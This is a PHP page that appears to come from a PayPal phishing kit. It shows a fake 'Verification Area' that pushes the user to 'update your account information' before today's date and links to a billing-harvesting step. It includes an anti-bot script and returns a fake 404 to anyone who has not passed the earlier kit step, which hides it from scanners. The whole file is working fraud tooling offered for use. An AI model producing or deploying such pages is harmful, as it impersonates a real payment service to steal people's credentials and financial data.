<?php
ob_start();
session_start();
if(isset($_SESSION['step_one'])){
$_SESSION['step_two']  = true;
include'../antibots.php';
date_default_timezone_set('GMT');
?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Verification Area</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
        </head>
        <body>
<?php include'navbar.php'?>
            <div class="contain">
                <div class="contain-info">
                   <p class="hd">What's going on?</p>
                   <div class="contain-lists">
                       <center>
                            <img src="../img/shield.png" /> 
							
                            
                       </center>
                       <b class="bold">
                          <br> <h5>Our servers have been updated to ensure better services and security.</h5>
               <h5>
<TD align=left>
<br>

<P>To complete the process, you must update your account information.</P>
<br>
<P><STRONG>The verification process must be completed before  -  <?php echo date("d/m/Y")?>.</STRONG></P>
<p>1.Click  <b>Confirm<b> and follow the steps.</p>
<p>2.Update your information.</p>
<p>3.Restore all advantages of your PayPal account.</p>
                       <center>
                           <a href="<?php echo 'billing.php?enc='.md5(time()).'&p=1&dispatch='.sha1(time()); ?>" class="proccess">Confirm</a>
                       </center>

                </div>
            </div>
<?php include'footer.php'?>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/plugins.js"></script>
        </body>
    </html>
<?php
}
else {
    header("HTTP/1.0 404 Not Found");
  die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>